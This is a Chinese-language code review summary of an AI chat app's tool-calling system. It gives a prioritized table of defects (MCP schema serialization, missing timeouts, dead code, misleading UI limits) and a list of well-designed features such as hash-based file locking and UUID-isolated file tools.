| P1 | E-101 | MCP schema 双重序列化 | MCP 工具参数 schema 可能损坏，模型无法正确调用 |
| P1 | E-104 | 执行模式无法切换 | 用户无法在会话内改 auto/semi/manual |
| P2 | E-102 | MCP 无超时/重连 | MCP server 掉线后无感知、无恢复 |
| P2 | E-103 | continuationBudget 死代码 | 续接预算机制名存实亡 |
| P2 | E-105 | 「无限制」实为 100 且静默截断 | UI 文案误导 + 截断无提示 |
| P2 | E-106 | 错误结果混入给模型的指令 | 用户在 UI 看到写给模型的纠错噪音 |
| P2 | E-108 | MCP 未走 ResultSizeOptimizer | 多模态/大结果处理不一致 |
| P3 | E-107 | 关键词猜测搜索意图 | 硬编码中文关键词，限制模型能力（且可能未接入主流程） |
| P3 | E-201~207 | 各类代码质量问题 | parseArgs 降级、Calculator 无函数、FTS 未实现、手拼 JSON 等 |

---

## 亮点（值得肯定的设计）

1. **文件操作的乐观锁与结构化错误反馈**：`FileWriteSkill`/`FilePatchSkill` 的 `expectedHash` + `HASH_MISMATCH`/`LINE_OUT_OF_RANGE` 错误码 + 带指引的错误文案（`formatPatchError`），对模型自我纠错非常友好，是高质量的 Skill 实现。
2. **文件工具的 UUID 隔离**：所有文件操作走 `dao.getByUuid(uuid)`，模型无法用文件工具写任意绝对路径，安全边界正确。
3. **多 provider 工具调用 fallback 解析**：`extractToolCallsFromText`（`ChatViewModel.kt:1526`）覆盖了 DSML、非标准 XML 标签（MiniMax/百川/智谱）、JSON 代码块等多种模型变体，并用 `isKnownTool` 校验工具名，防止日常对话里的 JSON 被误判为工具调用——鲁棒性不错。
4. **工具禁用时的防御性回写**：`ToolExecutor.executeTools` 在 `toolsEnabled=false` 时，会给每个工具调用回写一条「工具已禁用，请直接回答」的合成消息（`:38-52`），避免模型反复尝试调用被禁用的工具。
5. **`ModularSkillRegistry` 的组合设计**：内置/用户/MCP 三个注册器通过组合模式统一暴露，扩展新工具来源成本低。
